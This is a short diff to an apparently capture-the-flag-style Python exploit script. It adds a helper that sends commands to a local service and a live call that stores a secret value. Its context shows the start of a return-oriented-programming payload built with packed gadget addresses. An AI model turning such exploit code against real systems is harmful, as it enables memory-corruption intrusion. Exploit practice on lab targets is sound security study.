@@ -10,6 +10,15 @@ from console import console
 if len(sys.argv) != 2:
     sys.exit("Usage: %s PORT" % sys.argv[0])
 
+def orig_send_cmd(cmd):
+    port = int(sys.argv[1])
+    sock = socket.create_connection(('127.0.0.1', port),
+                                    socket.getdefaulttimeout(),
+                                    ('127.0.0.1', 0))
+
+    sock.sendall(cmd)
+    sock.close()
+
 def send_cmd(cmd):
     port = int(sys.argv[1])
     sock = socket.create_connection(('127.0.0.1', port),
@@ -27,7 +36,7 @@ def send_cmd(cmd):
         sys.stdout.write(buf)
     sock.close()
 
-#send_cmd("PUT SECRET p455w0rd! Soroush\r\n")
+orig_send_cmd("PUT SECRET p455w0rd! Secret Value\r\n")
 
 p = ''
 p += pack('<I', 0x080f1016) # pop eax ; ret
